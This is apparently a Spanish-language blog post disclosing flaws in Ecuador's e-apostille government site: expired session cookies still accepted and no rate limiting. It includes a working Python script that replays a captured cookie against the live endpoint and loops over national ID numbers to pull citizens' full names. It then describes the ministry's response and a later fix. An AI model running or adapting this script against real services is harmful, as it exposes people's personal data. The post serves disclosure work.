@@ -1,0 +1,91 @@
+I"�#<p>Por alguna razón, hace unos meses recibí un correo de parte del Ministerio de Relaciones Exteriores y Movilidad Humana del Ecuador.  Este correo anunciaba la disponibilidad de un <a href="https://www.cancilleria.gob.ec/2024/07/15/sistema-de-apostillas-y-legalizaciones-electronicas-del-ecuador/">nuevo servicio</a>  público, el cual permitía apostillar documentos electrónicos de forma oficial.</p>
+
+<p>El día de hoy, he decido escribir un artículo donde exploto unas vulnerabilidades que he encontrado mientras navegaba por el sitio.</p>
+
+<h2 id="authentication-bypass">Authentication Bypass</h2>
+
+<p>La aplicación falla al comprobar la validez de una cookie/sesión previamente expirada, esto permite a un atacante reusar la sesión y realizar acciones en nombre del usuario.</p>
+
+<p>Es decir, si un atacante consigue robar una sesión de usuario, él podrá realizar acciones en la cuenta o sesión de usuario como si tuviera las credenciales o autorización para realizar dichas acciones.</p>
+
+<p>En la imagen de abajo, se puede ver cómo la aplicación reacciona al recibir una solicitud sin una cookie en de autenticación en las cabeceras HTTP.</p>
+
+<p><img src="/assets/images/Screenshot 2024-12-24 at 16.32.12.png" />
+En la siguiente imágen, se muestra la respuesta de la aplicación ante una solicitud HTTP que incluye una cookie ya expirada. 
+<img src="/assets/images/Screenshot 2024-12-24 at 16.41.29.png" /></p>
+
+<p>En la imágen de arriba, se puede ver cómo claramente la aplicación falla al mostrar información sensible de otro usuario, mientras se hace uso de una sesion invalida. A pesar de existir una redirección, que idealmente debe llevar al usuario a volver a iniciar sesión, la aplicación entrega información de cualquier usuario para el cual se conozca su cédula, sin validar el tiempo de vida de la sesion.</p>
+
+<h2 id="lack-of-rate-limiting">Lack of Rate Limiting</h2>
+
+<p>La aplicación no pone un límite a la cantidad de solicitudes que un usuario puede realizar, lo cuál permite a un atacante realizar ataques de fuerza bruta para conseguir información privada de un usuario. La explotación de estás vulnerabilidades implica que un atacante puede realizar la suplantación de identidades de usuario e incluso causar interrupciones en el servicio.</p>
+
+<p>El siguiente código pretende explotar dos vulnerabilidades, una falla en el mecanismo de autenticación, y la falta de implementación de un mecanismos que eviten solicitudes reiteradas.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib3</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">();</span>
+
+  
+<span class="k">def</span> <span class="nf">brute_force</span><span class="p">():</span>
+
+<span class="c1">## Es necesario obtener una cookie expirada o valida. 
+</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+
+<span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"ASP.NET_SessionId=mldtgtkittjfy31eoz1ekp4s; .ASPXAUTH=2F1537AFB2BCEC54CD9429AF1F963DBEE3282C7EA685EBA4A6E9E62D485A8A98C4AA3D35D4261681186D8E96386A74613753B4FB2A1B20D04B2BD18550AF732AA2D460C7BEF5B9661CF9B5AEB386F802B5E4698B6FD42011F855E4F6018DD7E133FA4A1255FAF637B711D544DFF0698DFC6C5CC2408D21CEB023F453085EF9BF63BA1065C99A8FF992B23C1FE0CA3B5AF28ED6050A425CE12A532E123A13E9AC3D4CC5BD1EF63EAE6ED38E7B77E0E32A5A70E3A71FDE5D75C4A7D4E70E8132CD"</span><span class="p">,</span>
+<span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"</span><span class="p">,</span>
+<span class="s">"X-Requested-With"</span><span class="p">:</span> <span class="s">"XMLHttpRequest"</span><span class="p">,</span>
+<span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate, br"</span>
+<span class="p">}</span>
+
+<span class="c1"># Reemplazar por las cedulas que desees consultar
+</span>
+<span class="n">cedulas</span> <span class="o">=</span> <span class="p">(</span><span class="s">'CEDULA0'</span><span class="p">,</span><span class="s">'CEDULA1'</span><span class="p">,</span> <span class="s">'CEDULA2'</span><span class="p">,</span><span class="s">'CEDULA3'</span><span class="p">,</span> <span class="s">'CEDULA4'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">cedula</span> <span class="ow">in</span> <span class="n">cedulas</span><span class="p">:</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"numeroDocumento"</span><span class="p">:</span> <span class="n">cedula</span><span class="p">}</span>
+<span class="n">respuesta</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://eapostillas.cancilleria.gob.ec/Solicitud/ConsultarDatosRegistroCivil?numeroDocumento'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">texto_html</span> <span class="o">=</span> <span class="n">respuesta</span><span class="p">.</span><span class="n">text</span>
+<span class="n">patron</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'(?s)\s*(\{.*\})'</span>
+<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">patron</span><span class="p">,</span> <span class="n">texto_html</span><span class="p">)</span>
+<span class="n">json_data</span> <span class="o">=</span> <span class="n">match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_data</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s">'resultado'</span><span class="p">][</span><span class="s">'NombresCompletos'</span><span class="p">])</span>
+
+  
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+<span class="n">brute_force</span><span class="p">()</span>
+</code></pre></div></div>
+<h2 id="respuesta-de-la-cancilleria">Respuesta de la Cancilleria</h2>
+<p>Después de varias semanas de espera, por fin obtuve una respuesta, sin embargo esta fue muy decepcionante.</p>
+
+<p>Debo aclarar que, para entender el problema que expongo, no es necesario conocimientos avanzados en sistemas informáticos. Así que, tengo que admitir que no esperaba una respuesta como esta, mucho menos cuando solemos asumir que dos cabezas piensan mejor que una.</p>
+
+<p>El siguiente informe pretende dar una respuesta sobre las vulnerabilidades reportadas, sin embargo, ustedes pueden juzgar por si mismos.</p>
+
+<iframe src="https://drive.google.com/file/d/1lrfjMORi2kzgDZKoa2Bj39AtHxN9UnUO/preview" width="800" height="650" frameborder="0"></iframe>
+
+<h2 id="the-fix">“The Fix”</h2>
+
+<p>Después de haber leido la respuesta a mi reporte de vulnerabilidades, haber invertido tiempo y esfuerzo en este asunto, naturalmente uno puede llegar a la conclusion que ha sido un esfuerzo en vano.</p>
+
+<p>Pero no es así, ya que el día de hoy revisando nuevamente el serivicio de apostillas, he descubierto un pequeño cambio. Se ha agregado el parámetro token1, el cual asumo fue implementado para evitar reiteradas consultas al servicio.</p>
+
+<p>Al mismo tiempo, se puede observar que la aplicación valida efectivamente si la sesión de un usuario ha expirado, y de acuerdo a esto, decide si mostrar la información solicitada o no.</p>
+
+<p><img src="/assets/images/Screenshot 2025-03-08 at 01.09.48.png" /></p>
+
+<p>A pesar de que el proceso de remediación no fue tan fluido como esperadoba, y muchos inconvenientes en el camino, aún así vale la pena aportar un granito de arena a la seguridad del país. 🫶</p>
+
+:ET
